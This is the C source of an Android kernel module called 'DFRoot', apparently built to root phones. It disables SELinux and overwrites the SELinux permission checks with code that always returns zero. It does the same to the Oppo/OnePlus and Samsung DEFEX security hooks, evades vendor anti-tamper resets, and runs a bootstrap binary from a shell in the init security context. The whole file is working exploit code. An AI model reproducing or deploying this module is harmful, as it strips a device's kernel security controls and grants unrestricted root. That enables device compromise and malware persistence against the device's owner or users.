#include <linux/init.h>
#include <linux/kernel.h>
#include <linux/kmod.h>
#include <linux/kprobes.h>
#include <linux/module.h>
#include <linux/namei.h>
MODULE_LICENSE("GPL");
MODULE_DESCRIPTION("DFRoot LKM");

typedef unsigned long (*kallsyms_lookup_name_t)(const char *name);
typedef unsigned long (*module_kallsyms_lookup_name_t)(const char *name);
typedef void *(*umh_setup_t)(const char *path, char **argv, char **envp, gfp_t gfp,
                             void *init, void *cleanup, void *data);
typedef int (*umh_exec_t)(void *info, int wait);
typedef int  (*kern_path_t)(const char *, unsigned int, struct path *);
typedef int  (*invalidate_t)(struct address_space *);
typedef void (*path_put_t)(const struct path *);
typedef int  (*insn_patch_t)(void *addrs[], u32 insns[], int cnt);

static insn_patch_t insn_patch_text;

static __nocfi void patch_fn_ret_zero(void *fn)
{
    void *addrs[3];
    u32 insns[3];

    addrs[0] = fn;
    addrs[1] = (u8 *)fn + 4;
    addrs[2] = (u8 *)fn + 8;

    insns[0] = 0xD503245F;  // BTI C  (valid landing pad, NOP when BTI not enforced)
    insns[1] = 0xD2800000;  // MOV x0, #0
    insns[2] = 0xD65F03C0;  // RET

    if (insn_patch_text(addrs, insns, 3))
        pr_warn("dfroot: patch failed at %px\n", fn);
}

static int __nocfi __init dfroot_init(void)
{
    kallsyms_lookup_name_t get_addr;
    kern_path_t  kern_path_fn;
    invalidate_t invalidate_fn;
    path_put_t   path_put_fn;
    struct path  p;
    umh_setup_t umh_setup;
    umh_exec_t  umh_exec;
    bool *selinux_state;
    module_kallsyms_lookup_name_t mkln;
    struct kprobe kln_kp;
    void *avc_fn, *avc_noaudit_fn, *oplus_exe_fn, *oplus_root_fn, *defex_enforce_fn, *defex_umh_fn;
    void *info;
    int ret;

    // UMH command to run. Upstream 4.2-4.5 replaced the old
    // "touch /dev/dfm0; rmmod oplus_* 2>/dev/null; exit 0" chain. Those rmmods
    // tripped the Oppo/OnePlus security anti-tamper reset (our issue #21), and
    // because `sh -c` returns the exit code of the LAST command, a failing
    // rmmod also made the helper report "returned 256" everywhere else, which
    // is what killed the run at the verify stage (our issue #5). The vendor
    // hardening checks are now patched in-kernel with aarch64_insn_patch_text,
    // the helper only touches the marker and execs bootstrap, and the call is
    // UMH_WAIT_EXEC, so there is no child exit status left to leak.
    static const char sh[] = "/system/bin/sh";
    static const char bootstrap[] = "/data/user_de/0/df.root/bootstrap";
    static char cmd[512];
    static char *envp[] = { "PATH=/system/bin", NULL };
    static char *argv[] = { (char *)sh, "-c", cmd, NULL };
    snprintf(cmd, sizeof(cmd), "touch /dev/dfm0; echo -n 'u:r:init:s0' > /proc/self/attr/exec; exec %s", bootstrap);

    // Symbol finder
    kln_kp = (struct kprobe){ .symbol_name = "kallsyms_lookup_name" };
    if (register_kprobe(&kln_kp) < 0) {
        pr_err("dfroot: kallsyms_lookup_name not found\n");
        return -EINVAL;
    }
    get_addr = (kallsyms_lookup_name_t)kln_kp.addr;
    unregister_kprobe(&kln_kp);

    insn_patch_text = (insn_patch_t)get_addr("aarch64_insn_patch_text");
    if (!insn_patch_text) {
        pr_err("dfroot: aarch64_insn_patch_text not found\n");
        return -EINVAL;
    }

    mkln = (module_kallsyms_lookup_name_t)get_addr("module_kallsyms_lookup_name");

    // Invalidate page_cache for crash_dump64
    // NOTE: this can cause issues if a process is currently executing
    //   crash_dump64. We may want to revert to manual restore patching
    kern_path_fn  = (kern_path_t) get_addr("kern_path");
    invalidate_fn = (invalidate_t)get_addr("invalidate_inode_pages2");
    path_put_fn   = (path_put_t)  get_addr("path_put");
    if (!kern_path_fn || !invalidate_fn || !path_put_fn) {
        pr_err("dfroot: cache drop symbols missing\n");
    } else if (kern_path_fn("/apex/com.android.runtime/bin/crash_dump64",
                            LOOKUP_FOLLOW, &p)) {
        pr_err("dfroot: kern_path failed for crash_dump64\n");
    } else {
        invalidate_fn(p.dentry->d_inode->i_mapping);
        path_put_fn(&p);
        pr_info("dfroot: cleared page cache for crash_dump64\n");
    }

    // Disable SELinux
    selinux_state = (bool *)get_addr("selinux_state");
    if (!selinux_state) {
        pr_err("dfroot: selinux_state not found\n");
        return -EINVAL;
    }
    WRITE_ONCE(*selinux_state, false);
    pr_info("dfroot: selinux_state permissive\n");

    // Some kernels ship CONFIG_SECURITY_SELINUX_DEVELOP=n, so the selinux_state
    // write above is a no-op there — patch the SELinux checks themselves instead
    // (both: most denials surface through the noaudit path first).
    if (READ_ONCE(*selinux_state)) {
        avc_fn = (void *)get_addr("avc_has_perm");
        if (!avc_fn)
            pr_err("dfroot: avc_has_perm not found, skipping\n");
        else {
            patch_fn_ret_zero(avc_fn);
            pr_info("dfroot: avc_has_perm patched\n");
        }

        avc_noaudit_fn = (void *)get_addr("avc_has_perm_noaudit");
        if (!avc_noaudit_fn)
            pr_err("dfroot: avc_has_perm_noaudit not found, skipping\n");
        else {
            patch_fn_ret_zero(avc_noaudit_fn);
            pr_info("dfroot: avc_has_perm_noaudit patched\n");
        }
    }

    // Oppo/OnePlus
    oplus_exe_fn = (void *)(mkln ? mkln("oplus_exe_block_ret_handler") : 0);
    if (!oplus_exe_fn)
        pr_err("dfroot: oplus_exe_block_ret_handler not found, skipping\n");
    else {
        patch_fn_ret_zero(oplus_exe_fn);
        pr_info("dfroot: oplus_exe_block_ret_handler patched\n");
    }

    oplus_root_fn = (void *)(mkln ? mkln("oplus_root_check_post_handler") : 0);
    if (!oplus_root_fn)
        pr_err("dfroot: oplus_root_check_post_handler not found, skipping\n");
    else {
        patch_fn_ret_zero(oplus_root_fn);
        pr_info("dfroot: oplus_root_check_post_handler patched\n");
    }

    // Samsung
    defex_enforce_fn = (void *)get_addr("task_defex_enforce");
    if (!defex_enforce_fn)
        pr_err("dfroot: task_defex_enforce not found, skipping\n");
    else {
        patch_fn_ret_zero(defex_enforce_fn);
        pr_info("dfroot: task_defex_enforce patched\n");
    }

    defex_umh_fn = (void *)get_addr("task_defex_user_exec");
    if (!defex_umh_fn)
        pr_err("dfroot: task_defex_user_exec not found, skipping\n");
    else {
        patch_fn_ret_zero(defex_umh_fn);
        pr_info("dfroot: task_defex_user_exec patched\n");
    }

    // Run UMH command
    umh_setup = (umh_setup_t)get_addr("call_usermodehelper_setup");
    umh_exec  = (umh_exec_t)get_addr("call_usermodehelper_exec");
    if (!umh_setup || !umh_exec) {
        pr_err("dfroot: usermodehelper symbols missing (setup=%px exec=%px)\n",
               umh_setup, umh_exec);
        return -EINVAL;
    }

    info = umh_setup(sh, argv, envp, GFP_KERNEL, NULL, NULL, NULL);
    if (!info) {
        pr_err("dfroot: usermodehelper_setup: returned NULL\n");
        return -EINVAL;
    }
    // bypass CONFIG_STATIC_USERMODEHELPER_PATH="" overriding path to ""
    ((struct subprocess_info *)info)->path = sh;

    ret = umh_exec(info, UMH_WAIT_EXEC);
    pr_info("dfroot: usermodehelper_exec returned %d\n", ret);
    
    /* intentionally fail init to unload immediately; avoids triggering
     * mrdump module-loaded callbacks on MTK devices */
    return -ENODEV;
}

/* some kernels' cfi_init walks both __cfi_jt_init_module and __cfi_jt_cleanup_module
 * at load time; without a module_exit, the cleanup_module CFI jump table entry is
 * absent and cfi_init crashes in strcmp */
static void __exit dfroot_exit(void) {}

module_init(dfroot_init);
module_exit(dfroot_exit);
